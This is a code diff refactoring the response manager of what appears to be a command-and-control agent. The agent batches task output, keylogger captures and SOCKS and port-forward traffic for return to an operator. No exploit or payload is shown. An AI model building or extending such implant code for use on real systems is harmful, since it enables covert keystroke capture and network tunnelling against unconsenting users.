@@ -13,8 +13,8 @@ namespace Agent.Managers
     {
         private ConcurrentDictionary<string, TaskResponse> responseResults = new ConcurrentDictionary<string, TaskResponse>();
         private List<string> responseStrings = new List<string>();
-        //private ConcurrentDictionary<int, ServerDatagram> socksOut = new ConcurrentDictionary<int, ServerDatagram>();
-        private ConcurrentBag<ServerDatagram> socksOut = new ConcurrentBag<ServerDatagram>();
+        private ConcurrentDictionary<int, ServerDatagram> socksOut = new ConcurrentDictionary<int, ServerDatagram>();
+        //private ConcurrentBag<ServerDatagram> socksOut = new ConcurrentBag<ServerDatagram>();
         private ConcurrentDictionary<int, ServerDatagram> rpfwdOut = new ConcurrentDictionary<int, ServerDatagram>();
         private ConcurrentBag<InteractMessage> interactiveOut = new ConcurrentBag<InteractMessage>();
         private ConcurrentBag<DelegateMessage> delegateMessages = new ConcurrentBag<DelegateMessage>();
@@ -75,35 +75,41 @@ namespace Agent.Managers
         }
         private void AddSocksMessage(ServerDatagram dg)
         {
-            socksOut.Add(dg);
-            //socksOut.Add(dg)
-            //socksOut.AddOrUpdate(dg.server_id, dg, (existingKey, existingValue) =>
-            //{
-            //    // Key exists, update the existing ServerDatagram by adding bdata values
-            //    existingValue.bdata = Misc.CombineByteArrays(existingValue.bdata, dg.bdata);
-            //    //existingValue.bdata = Misc.CombineByteArrays(dg.bdata, existingValue.bdata);
-            //    if (!existingValue.exit && dg.exit)
-            //    {
-            //        existingValue.exit = true;
-            //    }
-            //    existingValue.data = Misc.Base64Encode(existingValue.bdata);
-            //    return existingValue;
-            //});
+            socksOut.AddOrUpdate(
+                dg.server_id,
+                dg,
+                (existingKey, existingValue) =>
+                {
+                    // Merge bdata values
+                    existingValue.bdata = Misc.CombineByteArrays(existingValue.bdata, dg.bdata);
+
+                    // Update the exit flag if needed
+                    existingValue.exit |= dg.exit;
+
+                    // Recalculate the Base64-encoded data string
+                    existingValue.data = Misc.Base64Encode(existingValue.bdata);
+
+                    return existingValue;
+                });
         }
         private void AddRpfwdMessage(ServerDatagram dg)
         {
-            rpfwdOut.AddOrUpdate(dg.server_id, dg, (existingKey, existingValue) =>
-            {
-                // Key exists, update the existing ServerDatagram by adding bdata values
-                existingValue.bdata = Misc.CombineByteArrays(existingValue.bdata, dg.bdata);
-                //existingValue.bdata = Misc.CombineByteArrays(dg.bdata, existingValue.bdata);
-                if (!existingValue.exit && dg.exit)
+            rpfwdOut.AddOrUpdate(
+                dg.server_id,
+                dg,
+                (existingKey, existingValue) =>
                 {
-                    existingValue.exit = true;
-                }
-                existingValue.data = Misc.Base64Encode(existingValue.bdata);
-                return existingValue;
-            });
+                    // Merge bdata values
+                    existingValue.bdata = Misc.CombineByteArrays(existingValue.bdata, dg.bdata);
+
+                    // Update the exit flag if needed
+                    existingValue.exit |= dg.exit;
+
+                    // Recalculate the Base64-encoded data string
+                    existingValue.data = Misc.Base64Encode(existingValue.bdata);
+
+                    return existingValue;
+                });
         }
         public async Task AddResponse(TaskResponse res)
         {
@@ -146,51 +152,61 @@ namespace Agent.Managers
         }
         public List<string> GetTaskResponsesAsync()
         {
-            foreach (TaskResponse response in responseResults.Values)
+
+            // Process and clear completed responses
+            foreach (var response in responseResults.Values)
             {
                 if (response.completed)
                 {
                     activeJobs.Remove(response.task_id, out _);
                 }
-                this.responseStrings.Add(response.ToJson());
+                responseStrings.Add(response.ToJson());
             }
-            this.responseResults.Clear();
+            responseResults.Clear();
 
-            List<string> returnResults = new List<string>(this.responseStrings);
-            this.responseStrings.Clear();
+            // Transfer response strings to a return list and clear the cache
+            var returnResults = new List<string>(responseStrings);
+            responseStrings.Clear();
 
+            // Handle keylog task, if applicable
             if (!string.IsNullOrEmpty(klTask) && klLogs.Count > 0)
             {
-                KeyPressTaskResponse krr = new KeyPressTaskResponse
+                var keyPressResponse = new KeyPressTaskResponse
                 {
                     task_id = klTask,
                     keylogs = klLogs.Values.ToList(),
                 };
 
-                krr.Prepare();
-                returnResults.Add(krr.ToJson());
+                keyPressResponse.Prepare();
+                returnResults.Add(keyPressResponse.ToJson());
                 klLogs.Clear();
             }
-            responseResults.Clear();
-            responseStrings.Clear();
+
             return returnResults;
         }
         public async Task Write(string? output, string task_id, bool completed, string status)
         {
-            responseResults.AddOrUpdate(task_id, new TaskResponse { user_output = output, completed = completed, status = status, task_id = task_id }, (k, t) =>
-            {
-                TaskResponse newResponse = t;
-                newResponse.user_output += output;
-                if (completed)
+            responseResults.AddOrUpdate(
+                task_id,
+                new TaskResponse
                 {
-                    newResponse.completed = true;
-                }
-                if (!string.IsNullOrEmpty(status))
+                    user_output = output,
+                    completed = completed,
+                    status = status,
+                    task_id = task_id
+                },
+                (key, existingResponse) =>
                 {
-                    newResponse.status = status;
-                }
-                return newResponse;
-            });
+                    existingResponse.user_output += output;
+
+                    // Update only if necessary
+                    existingResponse.completed |= completed;
+
+                    if (!string.IsNullOrEmpty(status))
+                        existingResponse.status = status;
+
+                    return existingResponse;
+                });
         }
         public async Task Write(string? output, string task_id, bool completed)
         {
@@ -198,20 +214,27 @@ namespace Agent.Managers
         }
         public async Task WriteLine(string? output, string task_id, bool completed, string status)
         {
-            responseResults.AddOrUpdate(task_id, new TaskResponse { user_output = output + Environment.NewLine, completed = completed, status = status, task_id = task_id }, (k, t) =>
-            {
-                var newResponse = (TaskResponse)t;
-                newResponse.user_output += output + Environment.NewLine;
-                if (completed)
+            responseResults.AddOrUpdate(
+                task_id,
+                new TaskResponse
                 {
-                    newResponse.completed = true;
-                }
-                if (!string.IsNullOrEmpty(status))
+                    user_output = output + Environment.NewLine,
+                    completed = completed,
+                    status = status,
+                    task_id = task_id
+                },
+                (key, existingResponse) =>
                 {
-                    newResponse.status = status;
-                }
-                return newResponse;
-            });
+                    existingResponse.user_output += output + Environment.NewLine;
+
+                    // Update properties only if necessary
+                    existingResponse.completed |= completed;
+
+                    if (!string.IsNullOrEmpty(status))
+                        existingResponse.status = status;
+
+                    return existingResponse;
+                });
         }
         public async Task WriteLine(string? output, string task_id, bool completed)
         {
@@ -233,22 +256,6 @@ namespace Agent.Managers
         {
             activeJobs.TryRemove(task_id, out _);
         }
-        //private async Task<List<ServerDatagram>> GetSocksMessagesAsync()
-        //{
-        //    List<ServerDatagram> messages = new List<ServerDatagram>();
-        //    if(assemblyManager.TryGetPlugin<IBufferedProxyPlugin>("socks", out var plugin))
-        //    {
-        //        messages.AddRange(await plugin.GetServerMessages());
-        //    }
-
-        //    if(this.socksOut.Count > 0)
-        //    {
-        //        messages.AddRange(this.socksOut.Values.ToList());
-        //        this.socksOut.Clear();
-        //    }
-        //    Console.WriteLine($"Returning: {messages.Count()} messages.");
-        //    return messages;
-        //} 
         public async Task<string> GetAgentResponseStringAsync()
         {
             var socksList = this.socksOut.ToList();
@@ -258,7 +265,7 @@ namespace Agent.Managers
                 action = "get_tasking",
                 tasking_size = -1,
                 delegates = delegateMessages.ToList(),
-                socks = socksList,
+                socks = this.socksOut.Values.ToList(),
                 responses = this.GetTaskResponsesAsync(),
                 rpfwd = this.rpfwdOut.Values.ToList(),
                 interactive = this.interactiveOut.Reverse().ToList(),
@@ -299,14 +306,6 @@ namespace Agent.Managers
         public async Task<string> GetStdOut()
         {
             return String.Empty;
-        }
-
-        public async Task AddResponses(List<ServerDatagram> dg)
-        {
-            //foreach(var d in dg)
-            //{
-            //    this.socksOut.Add(d);
-            //}
         }
     }
 }
